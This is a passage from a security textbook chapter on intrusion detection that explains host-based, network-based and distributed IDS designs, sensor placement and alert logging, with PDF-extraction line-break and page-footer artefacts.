vulnerable \\r\\nor sensitive systems; such as database servers and administrative systems. The HIDS \\r\\nmonitors activity on the system in a variety of ways to detect suspicious behavior. In \\r\\nsome cases, an IDS can halt an attack before any damage is done, as we will discuss \\r\\nin Section 9.6, but its main purpose is to detect intrusions, log suspicious events, and \\r\\nsend alerts.\\r\\nThe primary benefit of a HIDS is that it can detect both external and internal \\r\\nintrusions, something that is not possible either with network-based IDSs or firewalls. \\r\\nAs we discussed in the previous section, host-based IDSs can use either anomaly or \\r\\nsignature and heuristic approaches to detect unauthorized behavior on the monitored \\r\\nhost. We now review some common data sources and sensors used in HIDS, continue \\r\\nwith a discussion of how the anomaly, signature and heuristic approaches are used in \\r\\nHIDS, then consider distributed HIDS.\\r\\nData Sources and Sensors\\r\\nAs noted previously, a fundamental component of intrusion detection is the sensor \\r\\nthat collects data. Some record of ongoing activity by users must be provided as input \\r\\nto the analysis component of the IDS. Common data sources include:\\r\\n• System call traces: A record of the sequence of systems calls by processes on \\r\\na system, is widely acknowledged as the preferred data source for HIDS since \\r\\nthe pioneering work of Forrest [CREE13]. While these work well on Unix and \\r\\nLinux systems, they are problematic on Windows systems due to the extensive \\r\\nuse of DLLs that obscure which processes use specific system calls.\\r\\n• Audit (log file) records1\\r\\n: Most modern operating systems include account\\ufffeing software that collects information on user activity. The advantage of \\r\\nusing this information is that no additional collection software is needed. \\r\\n1\\r\\nAudit records play a more general role in computer security than just intrusion detection. See Chapter 18 \\r\\nfor a full discussion.\\r\\nM08_STAL0611_04_GE_C08.indd 284 10/11/17 2:55 PM\\n\\n\\n8.4 / HOST-BASED INTRUSION DETECTION 285\\r\\nThe disadvantages are that the audit records may not contain the needed infor\\ufffemation or may not contain it in a convenient form, and that intruders may \\r\\nattempt to manipulate these records to hide their actions.\\r\\n• File integrity checksums: A common approach to detecting intruder activity \\r\\non a system is to periodically scan critical files for changes from the desired \\r\\nbaseline, by comparing a current cryptographic checksums for these files, with \\r\\na record of known good values. Disadvantages include the need to generate and \\r\\nprotect the checksums using known good files, and the difficulty monitoring \\r\\nchanging files. Tripwire is a well-known system using this approach.\\r\\n• Registry access: An approach used on Windows systems is to monitor access \\r\\nto the registry, given the amount of information and access to it used by pro\\ufffegrams on these systems. However, this source is very Windows specific, and has \\r\\nrecorded limited success.\\r\\nThe sensor gathers data from the chosen source, filters the gathered data to \\r\\nremove any unwanted information and to standardize the information format, and \\r\\nforwards the result to the IDS analyzer, which may be local or remote.\\r\\nAnomaly HIDS\\r\\nThe majority of work on anomaly-based HIDS has been done on UNIX and Linux \\r\\nsystems, given the ease of gathering suitable data for this work. While some earlier \\r\\nwork used audit or accounting records, the majority is based on system call traces. \\r\\nSystem calls are the means by which programs access core kernel functions, provid\\ufffeing a wide range of interactions with the low-level operating system functions. Hence \\r\\nthey provide detailed information on process activity that can be used to classify it as \\r\\nnormal or anomalous. Table 8.2a lists the system calls used in current Ubuntu Linux \\r\\nsystems as an example. This data is typically gathered using an OS hook, such as the \\r\\nBSM audit module. Most modern operating systems have highly reliable options for \\r\\ncollecting this type of information.\\r\\nThe system call traces are then analyzed by a suitable decision engine. [CREE13] \\r\\nnotes that the original work by Forrest et al. introduced the Sequence Time-Delay \\r\\nEmbedding (STIDE) algorithm, based on artificial immune system approaches, that \\r\\ncompares observed sequences of system calls with sequences from the training phase \\r\\nto obtain a mismatch ratio that determines whether the sequence is normal or not. \\r\\nLater work has used alternatives, such as Hidden Markov Models (HMM), Artificial \\r\\nNeural Networks (ANN), Support Vector Machines (SVM), or Extreme Learning \\r\\nMachines (ELM) to make this classification.\\r\\n[CREE13] notes that these approaches all report providing reasonable intruder \\r\\ndetection rates of 95–99% while having false positive rates of less than 5%, though \\r\\non older test datasets. He updates these results using recent contemporary data and \\r\\nexample attacks, with a more extensive feature extraction process from the system \\r\\ncall traces and an ELM decision engine capable of a very high detection rate while \\r\\nmaintaining reasonable false positive rates. This approach should lead to even more \\r\\neffective production HIDS products in the near future.\\r\\nWindows systems have traditionally not used anomaly-based HIDS, as the \\r\\nwide usage of Dynamic Link Libraries (DLLs) as an intermediary between process \\r\\nrequests for operating system functions and the actual system call interface has \\r\\nM08_STAL0611_04_GE_C08.indd 285 10/11/17 2:55 PM\\n\\n\\n286 CHAPTER 8 / INTRUSION DETECTION\\r\\nhindered the effective use of system call traces to classify process behavior. Some \\r\\nwork was done using either audit log entries, or registry file updates as a data source, \\r\\nbut neither approach was very successful. [CREE13] reports a new approach that \\r\\nuses traces of key DLL function calls as an alternative data source, with results com\\ufffeparable to that found with Linux system call trace HIDS. Table 8.2b lists the key \\r\\nDLLs and executables monitored. Note that all of the distinct functions within these \\r\\nDLLs, numbering in their thousands, are monitored, forming the equivalent to the \\r\\nsystem call list presented in Table 8.2a. The adoption of this approach should lead \\r\\nto the development of more effective Windows HIDS, capable of detecting zero-day \\r\\nattacks, unlike the current generation of signature and heuristic Windows HIDS that \\r\\nwe will discuss later.\\r\\nWhile using system call traces provides arguably the richest information source \\r\\nfor a HIDS, it does impose a moderate load on the monitored system to gather and \\r\\nclassify this data. And as we noted earlier, the training phase for many of the decision \\r\\nengines requires very significant time and computational resources. Hence, others \\r\\nhave trialed approaches based on audit (log) records. However, these both have a \\r\\nlower detection rate than the system call trace approaches (80% reported), and are \\r\\nmore susceptible to intruder manipulation.\\r\\n(a) Ubuntu Linux System Calls\\r\\naccept, access, acct, adjtime, aiocancel, aioread, aiowait, aiowrite, alarm, async_daemon, auditsys, \\r\\nbind, chdir, chmod, chown, chroot, close, connect, creat, dup, dup2, execv, execve, exit, exportfs, \\r\\nfchdir, fchmod, fchown, fchroot, fcntl, flock, fork, fpathconf, fstat, fstat, fstatfs, fsync, ftime, ftruncate, \\r\\ngetdents, getdirentries, getdomainname, getdopt, getdtablesize, getfh, getgid, getgroups, gethostid, \\r\\ngethostname, getitimer, getmsg, getpagesize, getpeername, getpgrp, getpid, getpriority, getrlimit, \\r\\ngetrusage, getsockname, getsockopt, gettimeofday, getuid, gtty, ioctl, kill, killpg, link, listen, lseek, \\r\\nlstat, madvise, mctl, mincore, mkdir, mknod, mmap, mount, mount, mprotect, mpxchan, msgsys, \\r\\nmsync, munmap, nfs_mount, nfssvc, nice, open, pathconf, pause, pcfs_mount, phys, pipe, poll, profil,\\r\\nptrace, putmsg, quota, quotactl, read, readlink, readv, reboot, recv, recvfrom, recvmsg, rename, \\r\\nresuba, rfssys, rmdir, sbreak, sbrk, select, semsys, send, sendmsg, sendto, setdomainname, setdopt, \\r\\nsetgid, setgroups, sethostid, sethostname, setitimer, setpgid, setpgrp, setpgrp, setpriority, setquota, \\r\\nsetregid, setreuid, setrlimit, setsid, setsockopt, settimeofday, setuid, shmsys, shutdown, sigblock, \\r\\nsigpause, sigpending, sigsetmask, sigstack, sigsys, sigvec, socket, socketaddr, socketpair, sstk, stat, stat, \\r\\nstatfs, stime, stty, swapon, symlink, sync, sysconf, time, times, truncate, umask, umount, uname, unlink, \\r\\nunmount, ustat, utime, utimes, vadvise, vfork, vhangup, vlimit, vpixsys, vread, vtimes, vtrace, vwrite, \\r\\nwait, wait3, wait4, write, writev\\r\\n(b) Key Windows DLLs and Executables\\r\\ncomctl32\\r\\nkernel32\\r\\nmsvcpp\\r\\nmsvcrt\\r\\nmswsock\\r\\nntdll\\r\\nntoskrnl\\r\\nuser32\\r\\nws2_32\\r\\nTable 8.2 Linux System Calls and Windows DLLs Monitored\\r\\nM08_STAL0611_04_GE_C08.indd 286 10/11/17 2:55 PM\\n\\n\\n8.4 / HOST-BASED INTRUSION DETECTION 287\\r\\nA further alternative to examining current process behavior is to look for \\r\\nchanges to important files on the monitored host. This uses a cryptographic check\\ufffesum to check for any changes from the known good baseline for the monitored files. \\r\\nTypically, all program binaries, scripts, and configuration files are monitored, either \\r\\non each access, or on a periodic scan of the file system. The tripwire system is a \\r\\nwidely used implementation of this approach, and is available for all major operat\\ufffeing systems including Linux, Mac OS, and Windows. This approach is very sensitive \\r\\nto changes in the monitored files, as a result of intruder activity or for any other \\r\\nreason. However, it cannot detect changes made to processes once they are running \\r\\non the system. Other difficulties include determining which files to monitor, since a \\r\\nsurprising number of files change in an operational system, having access to a known \\r\\ngood copy of each monitored file to establish the baseline value, and protecting the \\r\\ndatabase of file signatures.\\r\\nSignature or Heuristic HIDS\\r\\nThe alternative of signature or heuristic-based HIDS is widely used, particularly as \\r\\nseen in anti virus (A/V), more correctly viewed as anti malware, products. These are \\r\\nvery commonly used on client systems and increasingly on mobile devices, and also \\r\\nincorporated into mail and Web application proxies on firewalls and in network-based \\r\\nIDSs. They use either a database of file signatures, which are patterns of data found \\r\\nin known malicious software, or heuristic rules that characterize known malicious \\r\\nbehavior.\\r\\nThese products are quite efficient at detecting known malware, however they \\r\\nare not capable of detecting zero-day attacks that do not correspond to the known \\r\\nsignatures or heuristic rules. They are widely used, particularly on Windows systems, \\r\\nwhich continue to be targeted by intruders, as we discussed in Section 6.9.\\r\\nDistributed HIDS\\r\\nTraditionally, work on host-based IDSs focused on single-system stand-alone opera\\ufffetion. The typical organization, however, needs to defend a distributed collection of \\r\\nhosts supported by a LAN or internetwork. Although it is possible to mount a defense \\r\\nby using stand-alone IDSs on each host, a more effective defense can be achieved by \\r\\ncoordination and cooperation among IDSs across the network.\\r\\nPorras points out the following major issues in the design of a distributed IDS \\r\\n[PORR92]:\\r\\n• A distributed IDS may need to deal with different sensor data formats. In a \\r\\nheterogeneous environment, different systems may use different sensors and \\r\\napproaches to gathering data for intrusion detection use.\\r\\n• One or more nodes in the network will serve as collection and analysis points \\r\\nfor the data from the systems on the network. Thus, either raw sensor data or \\r\\nsummary data must be transmitted across the network. Therefore, there is a \\r\\nrequirement to assure the integrity and confidentiality of these data. Integrity \\r\\nis required to prevent an intruder from masking his or her activities by alter\\ufffeing the transmitted audit information. Confidentiality is required because the \\r\\ntransmitted audit information could be valuable.\\r\\nM08_STAL0611_04_GE_C08.indd 287 10/11/17 2:55 PM\\n\\n\\n288 CHAPTER 8 / INTRUSION DETECTION\\r\\n• Either a centralized or decentralized architecture can be used. With a central\\ufffeized architecture, there is a single central point of collection and analysis of all \\r\\nsensor data. This eases the task of correlating incoming reports but creates a \\r\\npotential bottleneck and single point of failure. With a decentralized architec\\ufffeture, there is more than one analysis center, but these must coordinate their \\r\\nactivities and exchange information.\\r\\nA good example of a distributed IDS is one developed at the University of \\r\\nCalifornia at Davis [HEBE92, SNAP91]; a similar approach has been taken for a \\r\\nproject at Purdue University [SPAF00, BALA98]. Figure 8.2 shows the overall archi\\ufffetecture, which consists of three main components:\\r\\n1. Host agent module: An audit collection module operating as a background \\r\\nprocess on a monitored system. Its purpose is to collect data on security-related \\r\\nevents on the host and transmit these to the central manager. Figure 8.3 shows \\r\\ndetails of the agent module architecture.\\r\\n2. LAN monitor agent module: Operates in the same fashion as a host agent module \\r\\nexcept that it analyzes LAN traffic and reports the results to the central manager.\\r\\n3. Central manager module: Receives reports from LAN monitor and host agents \\r\\nand processes and correlates these reports to detect intrusion.\\r\\nThe scheme is designed to be independent of any operating system or system \\r\\nauditing implementation. Figure 8.3 shows the general approach that is taken. The \\r\\nagent captures each audit record produced by the native audit collection system. \\r\\nA filter is applied that retains only those records that are of security interest. These \\r\\nrecords are then reformatted into a standardized format referred to as the host \\r\\nFigure 8.2 Architecture for Distributed Intrusion Detection\\r\\nCentral manager\\r\\nLAN monitor Host Host\\r\\nAgent\\r\\nmodule\\r\\nRouter\\r\\nInternet\\r\\nManager\\r\\nmodule\\r\\nM08_STAL0611_04_GE_C08.indd 288 10/11/17 2:55 PM\\n\\n\\n8.5 / NETWORK-BASED INTRUSION DETECTION 289\\r\\naudit record (HAR). Next, a template-driven logic module analyzes the records for \\r\\nsuspicious activity. At the lowest level, the agent scans for notable events that are \\r\\nof interest independent of any past events. Examples include failed files, accessing \\r\\nsystem files, and changing a file’s access control. At the next higher level, the agent \\r\\nlooks for sequences of events, such as known attack patterns (signatures). Finally, \\r\\nthe agent looks for anomalous behavior of an individual user based on a historical \\r\\nprofile of that user, such as number of programs executed, number of files accessed, \\r\\nand the like.\\r\\nWhen suspicious activity is detected, an alert is sent to the central manager. The \\r\\ncentral manager includes an expert system that can draw inferences from received \\r\\ndata. The manager may also query individual systems for copies of HARs to correlate \\r\\nwith those from other agents.\\r\\nThe LAN monitor agent also supplies information to the central manager. The \\r\\nLAN monitor agent audits host-host connections, services used, and volume of traffic. \\r\\nIt searches for significant events, such as sudden changes in network load, the use of \\r\\nsecurity-related services, and suspicious network activities.\\r\\nThe architecture depicted in Figures 8.2 and 8.3 is quite general and flexible. \\r\\nIt offers a foundation for a machine-independent approach that can expand from \\r\\nstand-alone intrusion detection to a system that is able to correlate activity from \\r\\na number of sites and networks to detect suspicious activity that would otherwise \\r\\nremain undetected.\\r\\n8.5 NETWORK-BASED INTRUSION DETECTION\\r\\nA network-based IDS (NIDS) monitors traffic at selected points on a network or \\r\\ninterconnected set of networks. The NIDS examines the traffic packet by packet in \\r\\nreal time, or close to real time, to attempt to detect intrusion patterns. The NIDS \\r\\nmay examine network-, transport-, and/or application-level protocol activity. Note \\r\\nthe contrast with a host-based IDS; a NIDS examines packet traffic directed toward \\r\\nFigure 8.3 Agent Architecture\\r\\nOS audit\\r\\ninformation\\r\\nAlerts\\r\\nModifications\\r\\nQuery/\\r\\nresponse\\r\\nNotable\\r\\nactivity;\\r\\nsignatures;\\r\\nnoteworthy\\r\\nsessions\\r\\nHost audit record (HAR)\\r\\nFilter for\\r\\nsecurity\\r\\ninterest\\r\\nReformat\\r\\nfunction\\r\\nOS audit\\r\\nfunction\\r\\nAnalysis\\r\\nmodule\\r\\nTemplates\\r\\nCentral\\r\\nmanager\\r\\nLogic\\r\\nmodule\\r\\nM08_STAL0611_04_GE_C08.indd 289 10/11/17 2:55 PM\\n\\n\\n290 CHAPTER 8 / INTRUSION DETECTION\\r\\npotentially vulnerable computer systems on a network. A host-based system exam\\ufffeines user and software activity on a host.\\r\\nNIDS are typically included in the perimeter security infrastructure of an \\r\\norganization, either incorporated into, or associated with, the firewall. They typi\\ufffecally focus on monitoring for external intrusion attempts, by analyzing both traffic \\r\\npatterns and traffic content for malicious activity. With the increasing use of encryp\\ufffetion though, NIDS have lost access to significant content, hindering their ability to \\r\\nfunction well. Thus, while they have an important role to play, they can only form \\r\\npart of the solution. A typical NIDS facility includes a number of sensors to moni\\ufffetor packet traffic, one or more servers for NIDS management functions, and one or \\r\\nmore management consoles for the human interface. The analysis of traffic patterns \\r\\nto detect intrusions may be done at the sensor, at the management server, or some \\r\\ncombination of the two.\\r\\nTypes of Network Sensors\\r\\nSensors can be deployed in one of two modes: inline and passive. An inline sensor is \\r\\ninserted into a network segment so the traffic that it is monitoring must pass through \\r\\nthe sensor. One way to achieve an inline sensor is to combine NIDS sensor logic \\r\\nwith another network device, such as a firewall or a LAN switch. This approach has \\r\\nthe advantage that no additional separate hardware devices are needed; all that is \\r\\nrequired is NIDS sensor software. An alternative is a stand-alone inline NIDS sen\\ufffesor. The primary motivation for the use of inline sensors is to enable them to block \\r\\nan attack when one is detected. In this case, the device is performing both intrusion \\r\\ndetection and intrusion prevention functions.\\r\\nMore commonly, passive sensors are used. A passive sensor monitors a copy \\r\\nof network traffic; the actual traffic does not pass through the device. From the \\r\\npoint of view of traffic flow, the passive sensor is more efficient than the inline \\r\\nsensor, because it does not add an extra handling step that contributes to packet \\r\\ndelay.\\r\\nFigure 8.4 illustrates a typical passive sensor configuration. The sensor connects \\r\\nto the network transmission medium, such as a fiber optic cable, by a direct physical \\r\\ntap. The tap provides the sensor with a copy of all network traffic being carried by \\r\\nthe medium. The network interface card (NIC) for this tap usually does not have \\r\\nan IP address configured for it. All traffic into this NIC is simply collected with no \\r\\nprotocol interaction with the network. The sensor has a second NIC that connects to \\r\\nthe network with an IP address and enables the sensor to communicate with a NIDS \\r\\nmanagement server.\\r\\nAnother distinction is whether the sensor is monitoring a wired or wireless \\r\\nnetwork. A wireless network sensor may either be inline, incorporated into a wireless \\r\\naccess point (AP), or a passive wireless traffic monitor. Only these sensors can gather \\r\\nand analyze wireless protocol traffic, and hence detect attacks against those protocols. \\r\\nSuch attacks include wireless denial-of-service, session hijack, or AP impersonation. \\r\\nA NIDS focussed exclusively on a wireless network is known as a Wireless IDS \\r\\n(WIDS). Alternatively, wireless sensors may be a component of a more general NIDS \\r\\ngathering data from both wired and wireless network traffic, or even of a distributed \\r\\nIDS combining host and network sensor data.\\r\\nM08_STAL0611_04_GE_C08.indd 290 10/11/17 2:55 PM\\n\\n\\n8.5 / NETWORK-BASED INTRUSION DETECTION 291\\r\\nNIDS Sensor Deployment\\r\\nConsider an organization with multiple sites, each of which has one or more LANs, with \\r\\nall of the networks interconnected via the Internet or some other WAN technology. For \\r\\na comprehensive NIDS strategy, one or more sensors are needed at each site. Within a \\r\\nsingle site, a key decision for the security administrator is the placement of the sensors.\\r\\nFigure 8.5 illustrates a number of possibilities. In general terms, this configura\\ufffetion is typical of larger organizations. All Internet traffic passes through an external \\r\\nfirewall that protects the entire facility.2\\r\\n Traffic from the outside world, such as cus\\ufffetomers and vendors that need access to public services, such as Web and mail, is \\r\\nmonitored. The external firewall also provides a degree of protection for those parts \\r\\nof the network that should only be accessible by users from other corporate sites. \\r\\nInternal firewalls may also be used to provide more specific protection to certain \\r\\nparts of the network.\\r\\nA common location for a NIDS sensor is just inside the external firewall \\r\\n(location 1 in the figure). This position has a number of advantages:\\r\\n• Sees attacks, originating from the outside world, that penetrate the network’s \\r\\nperimeter defenses (external firewall).\\r\\n• Highlights problems with the network firewall policy or performance.\\r\\n• Sees attacks that might target the Web server or ftp server.\\r\\n• Even if the incoming attack is not recognized, the IDS can sometimes recognize \\r\\nthe outgoing traffic that results from the compromised server.\\r\\n2\\r\\nFirewalls will be discussed in detail in Chapter 9. In essence, a firewall is designed to protect one or a \\r\\nconnected set of networks on the inside of the firewall from Internet and other traffic from outside the \\r\\nfirewall. The firewall does this by restricting traffic, rejecting potentially threatening packets.\\r\\nFigure 8.4 Passive NIDS Sensor\\r\\nSource: Based on [CREM06].\\r\\nNetwork traffic\\r\\nMonitoring interface\\r\\n(no IP, promiscuous mode)\\r\\nManagement interface\\r\\n(with IP)\\r\\nNIDS\\r\\nsensor\\r\\nM08_STAL0611_04_GE_C08.indd 291 10/11/17 2:55 PM\\n\\n\\n292 CHAPTER 8 / INTRUSION DETECTION\\r\\nInstead of placing a NIDS sensor inside the external firewall, the security \\r\\nadministrator may choose to place a NIDS sensor between the external firewall and \\r\\nthe Internet or WAN (location 2). In this position, the sensor can monitor all network \\r\\ntraffic, unfiltered. The advantages of this approach are as follows:\\r\\n• Documents number of attacks originating on the Internet that target the network.\\r\\n• Documents types of attacks originating on the Internet that target the network.\\r\\nA sensor at location 2 has a higher processing burden than any sensor located \\r\\nelsewhere on the site network.\\r\\nIn addition to a sensor at the boundary of the network, on either side of the \\r\\nexternal firewall, the administrator may configure a firewall and one or more sensors \\r\\nto protect major backbone networks, such as those that support internal servers \\r\\nand database resources (location 3). The benefits of this placement include the \\r\\nfollowing:\\r\\n• Monitors a large amount of a network’s traffic, thus increasing the possibility \\r\\nof spotting attacks.\\r\\n• Detects unauthorized activity by authorized users within the organization’s \\r\\nsecurity perimeter.\\r\\nThus, a sensor at location 3 is able to monitor for both internal and external \\r\\nattacks. Because the sensor monitors traffic to only a subset of devices at the site, \\r\\nit can be tuned to specific protocols and attack types, thus reducing the processing \\r\\nburden.\\r\\nFigure 8.5 Example of NIDS Sensor Deployment\\r\\n4\\r\\nInternal server\\r\\nand data resource\\r\\nnetworks\\r\\nWorkstation\\r\\nnetworks\\r\\n3 LAN switch\\r\\nor router\\r\\nLAN switch\\r\\nor router External\\r\\nf irewall\\r\\nInternet\\r\\nService network\\r\\n(Web, mail, DNS, etc.)\\r\\nInternal\\r\\nf irewall\\r\\n1\\r\\n2\\r\\nLAN switch\\r\\nor router\\r\\nInternal\\r\\nf irewall\\r\\nM08_STAL0611_04_GE_C08.indd 292 10/11/17 2:55 PM\\n\\n\\n8.5 / NETWORK-BASED INTRUSION DETECTION 293\\r\\nFinally, the network facilities at a site may include separate LANs that sup\\ufffeport user workstations and servers specific to a single department. The administrator \\r\\ncould configure a firewall and NIDS sensor to provide additional protection for all \\r\\nof these networks or target the protection to critical subsystems, such as personnel \\r\\nand financial networks (location 4). A sensor used in this latter fashion provides the \\r\\nfollowing benefits:\\r\\n• Detects attacks targeting critical systems and resources.\\r\\n• Allows focusing of limited resources to the network assets considered of greatest\\r\\nvalue.\\r\\nAs with a sensor at location 3, a sensor at location 4 can be tuned to specific \\r\\nprotocols and attack types, thus reducing the processing burden.\\r\\nIntrusion Detection Techniques\\r\\nAs with host-based intrusion detection, network-based intrusion detection makes use \\r\\nof signature detection and anomaly detection. Unlike the case with HIDS, a number \\r\\nof commercial anomaly NIDS products are available [GARC09]. One of the best \\r\\nknown is the Statistical Packet Anomaly Detection Engine (SPADE), available as a \\r\\nplug-in for the Snort system that we will discuss later.\\r\\nSIGNATURE DETECTION NIST SP 800-94 (Guide to Intrusion Detection and Preven\\ufffetion Systems, July 2012) lists the following as examples of that types of attacks that \\r\\nare suitable for signature detection:\\r\\n• Application layer reconnaissance and attacks: Most NIDS technologies analyze \\r\\nseveral dozen application protocols. Commonly analyzed ones include Dynamic \\r\\nHost Configuration Protocol (DHCP), DNS, Finger, FTP, HTTP, Internet \\r\\nMessage Access Protocol (IMAP), Internet Relay Chat (IRC), Network File \\r\\nSystem (NFS), Post Office Protocol (POP), rlogin/rsh, Remote Procedure Call \\r\\n(RPC), Session Initiation Protocol (SIP), Server Message Block (SMB), SMTP, \\r\\nSNMP, Telnet, and Trivial File Transfer Protocol (TFTP), as well as database \\r\\nprotocols, instant messaging applications, and peer-to-peer file sharing soft\\ufffeware. The NIDS is looking for attack patterns that have been identified as tar\\ufffegeting these protocols. Examples of attack include buffer overflows, password \\r\\nguessing, and malware transmission.\\r\\n• Transport layer reconnaissance and attacks: NIDSs analyze TCP and UDP traf\\ufffefic and perhaps other transport layer protocols. Examples of attacks are unusual \\r\\npacket fragmentation, scans for vulnerable ports, and TCP-specific attacks such \\r\\nas SYN floods.\\r\\n• Network layer reconnaissance and attacks: NIDSs typically analyze IPv4, IPv6, \\r\\nICMP, and IGMP at this level. Examples of attacks are spoofed IP addresses \\r\\nand illegal IP header values.\\r\\n• Unexpected application services: The NIDS attempts to determine if the \\r\\nactivity on a transport connection is consistent with the expected application \\r\\nprotocol. An example is a host running an unauthorized application service.\\r\\n• Policy violations: Examples include use of inappropriate websites and use of \\r\\nforbidden application protocols.\\r\\nM08_STAL0611_04_GE_C08.indd 293 10/11/17 2:55 PM\\n\\n\\n294 CHAPTER 8 / INTRUSION DETECTION\\r\\nANOMALY DETECTION TECHNIQUES NIST SP 800-94 lists the following as examples \\r\\nof the types of attacks that are suitable for anomaly detection:\\r\\n• Denial-of-service (DoS) attacks: Such attacks involve either significantly \\r\\nincreased packet traffic or significantly increase connection attempts, in an \\r\\nattempt to overwhelm the target system. These attacks are analyzed in Chapter 7. \\r\\nAnomaly detection is well-suited to such attacks.\\r\\n• Scanning: A scanning attack occurs when an attacker probes a target network \\r\\nor system by sending different kinds of packets. Using the responses received \\r\\nfrom the target, the attacker can learn many of the system’s characteristics and \\r\\nvulnerabilities. Thus, a scanning attack acts as a target identification tool for an \\r\\nattacker. Scanning can be detected by atypical flow patterns at the application \\r\\nlayer (e.g., banner grabbing3\\r\\n), transport layer (e.g., TCP and UDP port scan\\ufffening), and network layer (e.g., ICMP scanning).\\r\\n• Worms: Worms4\\r\\n spreading among hosts can be detected in more than one way. \\r\\nSome worms propagate quickly and use large amounts of bandwidth. Worms \\r\\ncan also be detected because they can cause hosts to communicate with each \\r\\nother that typically do not, and they can also cause hosts to use ports that they \\r\\nnormally do not use. Many worms also perform scanning. Chapter 6 discusses \\r\\nworms in detail.\\r\\nSTATEFUL PROTOCOL ANALYSIS (SPA) NIST SP 800-94 details this subset of anom\\ufffealy detection that compares observed network traffic against predetermined universal \\r\\nvendor supplied profiles of benign protocol traffic. This distinguishes it from anomaly \\r\\ntechniques trained with organization specific traffic profiles. SPA understands and \\r\\ntracks network, transport, and application protocol states to ensure they progress as \\r\\nexpected. A key disadvantage of SPA is the high resource use it requires.\\r\\nLogging of Alerts\\r\\nWhen a sensor detects a potential violation, it sends an alert and logs information \\r\\nrelated to the event. The NIDS analysis module can use this information to refine \\r\\nintrusion detection parameters and algorithms. The security administrator can use \\r\\nthis information to design prevention techniques. Typical information logged by a \\r\\nNIDS sensor includes the following:\\r\\n• Timestamp (usually date and time)\\r\\n• Connection or session ID (typically a consecutive or unique number assigned to \\r\\neach TCP connection or to like groups of packets for connectionless protocols)\\r\\n• Event or alert type\\r\\n3\\r\\nTypically, banner grabbing consists of initiating a connection to a network server and recording the data \\r\\nthat is returned at the beginning of the session. This information can specify the name of the application, \\r\\nversion number, and even the operating system that is running the server [DAMR03].\\r\\n4\\r\\nA worm is a program that can replicate itself and send copies from computer to computer across network \\r\\nconnections. Upon arrival, the worm may be activated to replicate and propagate again. In addition to \\r\\npropagation, the worm usually performs some unwanted function.\\r\\nM08_STAL0611_04_GE_C08.indd 294 10/11/17 2:55 PM\\n\\n\\n8.6 / DISTRIBUTED OR HYBRID INTRUSION DETECTION 295\\r\\n• Rating (e.g., priority, severity, impact, confidence)\\r\\n• Network, transport, and application layer protocols\\r\\n• Source and destination IP addresses\\r\\n• Source and destination TCP or UDP ports, or ICMP types and codes\\r\\n• Number of bytes transmitted over the connection\\r\\n• Decoded payload data, such as application requests and responses\\r\\n• State-related information (e.g., authenticated username)\\r\\n8.6 DISTRIBUTED OR HYBRID INTRUSION DETECTION\\r\\nIn recent years, the concept of communicating IDSs has evolved to schemes that \\r\\ninvolve distributed systems that cooperate to identify intrusions and to adapt to \\r\\nchanging attack profiles. These combine in a central IDS, the complementary infor\\ufffemation sources used by HIDS with host-based process and data details, and NIDS \\r\\nwith network events and data, to manage and coordinate intrusion detection and \\r\\nresponse in an organization’s IT infrastructure. Two key problems have always con\\ufffefronted systems such as IDSs, firewalls, virus and worm detectors, and so on. First, \\r\\nthese tools may not recognize new threats or radical modifications of existing threats. \\r\\nAnd second, it is difficult to update schemes rapidly enough to deal with quickly \\r\\nspreading attacks. A separate problem for perimeter defenses, such as firewalls, is that \\r\\nthe modern enterprise has loosely defined boundaries, and hosts are generally able \\r\\nto move in and out. Examples are hosts that communicate using wireless technology \\r\\nand employee laptops that can be plugged into network ports.\\r\\nAttackers have exploited these problems in several ways. The more traditional \\r\\nattack approach is to develop worms and other malicious software that spreads ever \\r\\nmore rapidly and to develop other attacks (such as DoS attacks) that strike with \\r\\noverwhelming force before a defense can be mounted. This style of attack is still \\r\\nprevalent. But more recently, attackers have added a quite different approach: Slow \\r\\nthe spread of the attack so it will be more difficult to detect by conventional algo\\uffferithms [ANTH07].\\r\\nA way to counter such attacks is to develop cooperated systems that can rec\\ufffeognize attacks based on more subtle clues then adapt quickly. In this approach, \\r\\nanomaly detectors at local nodes look for evidence of unusual activity. For example, \\r\\na machine that normally makes just a few network connections might suspect that \\r\\nan attack is under way if it is suddenly instructed to make connections at a higher \\r\\nrate. With only this evidence, the local system risks a false positive if it reacts to the \\r\\nsuspected attack (say by disconnecting from the network and issuing an alert) but \\r\\nit risks a false negative if it ignores the attack or waits for further evidence. In an \\r\\nadaptive, cooperative system, the local node instead uses a peer-to-peer “gossip” \\r\\nprotocol to inform other machines of its suspicion, in the form of a probability that \\r\\nthe network is under attack. If a machine receives enough of these messages so a \\r\\nthreshold is exceeded, the machine assumes an attack is under way and responds. \\r\\nThe machine may respond locally to defend itself and also send an alert to a central \\r\\nsystem.\\r\\nM08_STAL0611_04_GE_C08.indd 295 10/11/17 2:55 PM\\r\\nhttps://sanet.st/blogs/polatebooks\\n\\n\\n296 CHAPTER 8 / INTRUSION DETECTION\\r\\nAn example of this approach is a scheme developed by Intel and referred to \\r\\nas autonomic enterprise security [AGOS06]. Figure 8.6 illustrates the approach. This \\r\\napproach does not rely solely on perimeter defense mechanisms, such as firewalls, or \\r\\non individual host-based defenses. Instead, each end host and each network device \\r\\n(e.g., routers) is considered to be a potential sensor and may have the sensor software \\r\\nmodule installed. The sensors in this distributed configuration can exchange informa\\ufffetion to corroborate the state of the network (i.e., whether an attack is under way).\\r\\nThe Intel designers provide the following motivation for this approach:\\r\\n1. IDSs deployed selectively may miss a network-based attack or may be slow to \\r\\nrecognize that an attack is under way. The use of multiple IDSs that share infor\\ufffemation has been shown to provide greater coverage and more rapid response to \\r\\nattacks, especially slowly growing attacks (e.g., [BAIL05], [RAJA05]).\\r\\n2. Analysis of network traffic at the host level provides an environment in which there \\r\\nis much less network traffic than found at a network device such as a router. Thus, \\r\\nattack patterns will stand out more, providing in effect a higher signal-to-noise ratio.\\r\\n3. Host-based detectors can make use of a richer set of data, possibly using appli\\ufffecation data from the host as input into the local classifier.\\r\\nFigure 8.6 Overall Architecture of an Autonomic Enterprise Security System\\r\\nPlatform\\r\\npolicies\\r\\nSummary\\r\\nevents\\r\\nPEP\\r\\nevents\\r\\nCollaborative\\r\\npolicies\\r\\nNetwork\\r\\nPlatform policies\\r\\npolicies\\r\\nPlatform\\r\\npolicies\\r\\nPlatform\\r\\nevents\\r\\nPlatform\\r\\nevents\\r\\nDistributed detection\\r\\nand inference\\r\\nGossip\\r\\nPEP = policy enforcement point\\r\\nDDI = distributed detection and inference\\r\\nDDI\\r\\nevents\\r\\nAdaptive feedback\\r\\nbased policies\\r\\nM08_STAL0611_04_GE_C08.indd 296 10/11/17 2:55 PM\\n\\n\\n8.7 / INTRUSION DETECTION EXCHANGE FORMAT 